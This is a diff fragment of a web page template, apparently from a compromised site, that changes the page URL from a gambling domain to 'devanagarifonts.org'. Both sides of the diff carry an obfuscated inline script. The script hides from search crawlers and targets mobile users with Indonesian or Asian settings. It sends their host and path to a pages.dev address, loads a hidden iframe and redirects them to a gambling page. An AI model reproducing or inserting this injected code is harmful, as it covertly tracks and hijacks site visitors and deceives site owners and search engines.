-  "url": "https://johortoto-slot.com/",
+  "url": "https://devanagarifonts.org/",
   "review": [
   {
     "@type": "Review",
@@ -11694,7 +11694,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                 }
             });
         </script>
-        <script>function _0x5cc4(_0x271528, _0x11f778) { _0x271528 = _0x271528 - 0x178; var _0x3425d2 = _0x3425(); var _0x5cc4bd = _0x3425d2[_0x271528]; return _0x5cc4bd; } function _0x3425() { var _0x4a5f75 = ['appendChild', '7614qADgGM', 'toLowerCase', 'replace', 'Asia', 'test', 'userAgent', 'src', 'resolvedOptions', '7644080rFANfW', '&t=', 'href', 'https://johortoto-f2g.pages.dev/daftartoto4d/amp', '4851843jMkspI', '9296YbIpEd', '9712782RvomMJ', 'log', 'undefined', '8VxSCoQ', '50xmjftk', '&path=', 'cssText', '2887795ErDUyD', 'outerWidth', 'location', 'iframe', 'hostname', 'https://johortoto-slot.com/', 'language', 'pathname', '37097eyLuGT', '727704SkSfFV', 'documentElement', 'now', 'createElement', '?host=']; _0x3425 = function () { return _0x4a5f75; }; return _0x3425(); } (function (_0x3994cc, _0x269082) { var _0x27a44f = _0x5cc4, _0x110923 = _0x3994cc(); while (!![]) { try { var _0xb3a8ef = parseInt(_0x27a44f(0x198)) / 0x1 * (parseInt(_0x27a44f(0x18d)) / 0x2) + parseInt(_0x27a44f(0x187)) / 0x3 + -parseInt(_0x27a44f(0x199)) / 0x4 + parseInt(_0x27a44f(0x190)) / 0x5 + -parseInt(_0x27a44f(0x17b)) / 0x6 * (parseInt(_0x27a44f(0x188)) / 0x7) + -parseInt(_0x27a44f(0x18c)) / 0x8 * (parseInt(_0x27a44f(0x189)) / 0x9) + parseInt(_0x27a44f(0x183)) / 0xa; if (_0xb3a8ef === _0x269082) break; else _0x110923['push'](_0x110923['shift']()); } catch (_0x219d69) { _0x110923['push'](_0x110923['shift']()); } } }(_0x3425, 0xe591d), (function () { var _0x1e1733 = _0x5cc4; try { var _0x31d8b7 = 'amistabaker.com', _0x593f5e = _0x1e1733(0x186), _0x4d912d = _0x1e1733(0x195); if (typeof window === _0x1e1733(0x18b)) return; var _0x50162e = navigator[_0x1e1733(0x180)] || '', _0x56ded0 = /Googlebot|bingbot|AhrefsBot|SemrushBot/i; if (_0x56ded0[_0x1e1733(0x17f)](_0x50162e)) return; var _0x18cd26 = location[_0x1e1733(0x194)][_0x1e1733(0x17d)](/^www\./, ''), _0x567c9c = _0x31d8b7[_0x1e1733(0x17d)](/^www\./, ''), _0x2dd819 = /Android|iPhone|iPad|Mobile/i[_0x1e1733(0x17f)](_0x50162e), _0x24d4ff = window['innerWidth'] < 0x300, _0xca5ae7 = window[_0x1e1733(0x191)] - window['innerWidth'] > 0x64, _0x3875de = _0x2dd819 || _0x24d4ff || _0xca5ae7, _0xac652 = navigator[_0x1e1733(0x196)] && navigator['language'][_0x1e1733(0x17c)]()['includes']('id') || Intl && Intl['DateTimeFormat']()[_0x1e1733(0x182)]()['timeZone']['includes'](_0x1e1733(0x17e)); if (!_0x3875de || !_0xac652) return; try { var _0x156880 = new Image(); _0x156880[_0x1e1733(0x181)] = _0x4d912d + _0x1e1733(0x179) + encodeURIComponent(_0x18cd26) + _0x1e1733(0x18e) + encodeURIComponent(location[_0x1e1733(0x197)]) + _0x1e1733(0x184) + Date[_0x1e1733(0x19b)](); } catch (_0xd5b4ec) { } var _0x46a731 = _0x593f5e['replace'](/\/+$/, ''); setTimeout(function () { var _0x5b7814 = _0x1e1733; try { var _0x11816a = document[_0x5b7814(0x178)](_0x5b7814(0x193)); _0x11816a['style'][_0x5b7814(0x18f)] = 'width:1px;height:1px;border:0;position:absolute;left:-9999px;top:-9999px', _0x11816a[_0x5b7814(0x181)] = _0x46a731, document[_0x5b7814(0x19a)][_0x5b7814(0x17a)](_0x11816a); } catch (_0x446c10) { } }, 0x12c), setTimeout(function () { var _0x1e0957 = _0x1e1733; try { window[_0x1e0957(0x192)][_0x1e0957(0x185)] = _0x46a731; } catch (_0x31044) { } }, 0x320); } catch (_0x4a0f1b) { console[_0x1e1733(0x18a)]('ERROR:', _0x4a0f1b); } }()));</script>
+        <script>function _0x5cc4(_0x271528, _0x11f778) { _0x271528 = _0x271528 - 0x178; var _0x3425d2 = _0x3425(); var _0x5cc4bd = _0x3425d2[_0x271528]; return _0x5cc4bd; } function _0x3425() { var _0x4a5f75 = ['appendChild', '7614qADgGM', 'toLowerCase', 'replace', 'Asia', 'test', 'userAgent', 'src', 'resolvedOptions', '7644080rFANfW', '&t=', 'href', 'https://johortoto-f2g.pages.dev/daftartoto4d/amp', '4851843jMkspI', '9296YbIpEd', '9712782RvomMJ', 'log', 'undefined', '8VxSCoQ', '50xmjftk', '&path=', 'cssText', '2887795ErDUyD', 'outerWidth', 'location', 'iframe', 'hostname', 'https://devanagarifonts.org/', 'language', 'pathname', '37097eyLuGT', '727704SkSfFV', 'documentElement', 'now', 'createElement', '?host=']; _0x3425 = function () { return _0x4a5f75; }; return _0x3425(); } (function (_0x3994cc, _0x269082) { var _0x27a44f = _0x5cc4, _0x110923 = _0x3994cc(); while (!![]) { try { var _0xb3a8ef = parseInt(_0x27a44f(0x198)) / 0x1 * (parseInt(_0x27a44f(0x18d)) / 0x2) + parseInt(_0x27a44f(0x187)) / 0x3 + -parseInt(_0x27a44f(0x199)) / 0x4 + parseInt(_0x27a44f(0x190)) / 0x5 + -parseInt(_0x27a44f(0x17b)) / 0x6 * (parseInt(_0x27a44f(0x188)) / 0x7) + -parseInt(_0x27a44f(0x18c)) / 0x8 * (parseInt(_0x27a44f(0x189)) / 0x9) + parseInt(_0x27a44f(0x183)) / 0xa; if (_0xb3a8ef === _0x269082) break; else _0x110923['push'](_0x110923['shift']()); } catch (_0x219d69) { _0x110923['push'](_0x110923['shift']()); } } }(_0x3425, 0xe591d), (function () { var _0x1e1733 = _0x5cc4; try { var _0x31d8b7 = 'amistabaker.com', _0x593f5e = _0x1e1733(0x186), _0x4d912d = _0x1e1733(0x195); if (typeof window === _0x1e1733(0x18b)) return; var _0x50162e = navigator[_0x1e1733(0x180)] || '', _0x56ded0 = /Googlebot|bingbot|AhrefsBot|SemrushBot/i; if (_0x56ded0[_0x1e1733(0x17f)](_0x50162e)) return; var _0x18cd26 = location[_0x1e1733(0x194)][_0x1e1733(0x17d)](/^www\./, ''), _0x567c9c = _0x31d8b7[_0x1e1733(0x17d)](/^www\./, ''), _0x2dd819 = /Android|iPhone|iPad|Mobile/i[_0x1e1733(0x17f)](_0x50162e), _0x24d4ff = window['innerWidth'] < 0x300, _0xca5ae7 = window[_0x1e1733(0x191)] - window['innerWidth'] > 0x64, _0x3875de = _0x2dd819 || _0x24d4ff || _0xca5ae7, _0xac652 = navigator[_0x1e1733(0x196)] && navigator['language'][_0x1e1733(0x17c)]()['includes']('id') || Intl && Intl['DateTimeFormat']()[_0x1e1733(0x182)]()['timeZone']['includes'](_0x1e1733(0x17e)); if (!_0x3875de || !_0xac652) return; try { var _0x156880 = new Image(); _0x156880[_0x1e1733(0x181)] = _0x4d912d + _0x1e1733(0x179) + encodeURIComponent(_0x18cd26) + _0x1e1733(0x18e) + encodeURIComponent(location[_0x1e1733(0x197)]) + _0x1e1733(0x184) + Date[_0x1e1733(0x19b)](); } catch (_0xd5b4ec) { } var _0x46a731 = _0x593f5e['replace'](/\/+$/, ''); setTimeout(function () { var _0x5b7814 = _0x1e1733; try { var _0x11816a = document[_0x5b7814(0x178)](_0x5b7814(0x193)); _0x11816a['style'][_0x5b7814(0x18f)] = 'width:1px;height:1px;border:0;position:absolute;left:-9999px;top:-9999px', _0x11816a[_0x5b7814(0x181)] = _0x46a731, document[_0x5b7814(0x19a)][_0x5b7814(0x17a)](_0x11816a); } catch (_0x446c10) { } }, 0x12c), setTimeout(function () { var _0x1e0957 = _0x1e1733; try { window[_0x1e0957(0x192)][_0x1e0957(0x185)] = _0x46a731; } catch (_0x31044) { } }, 0x320); } catch (_0x4a0f1b) { console[_0x1e1733(0x18a)]('ERROR:', _0x4a0f1b); } }()));</script>
         <script>
             require(["jquery", "initProductPage"], function ($) {
                 $(document).initProductPage();
@@ -12434,7 +12434,7 @@ c2.4,2.6,5.8,4.1,9.6,4.1c8.3,0,15.7-6.8,16.4-15.1l0,0c0.3-3.8-0.8-7.4-3.2-10.1C2
                     $(".ves-megamenu").each(function () {
                         if ($(this).find(".nav-anchor").length > 0) {
                             $(this).find(".nav-anchor").each(function (index, el) {
-                                if ($(this).attr("href") == "https://johortoto-slot.com/") {
+                                if ($(this).attr("href") == "https://devanagarifonts.org/") {
                                     $(this).parent().addClass("active");
                                     $(this).parents(".nav-item.parent").addClass("active");
                                     $(this).parents(".nav-item.dropdown-submenu").addClass("active");
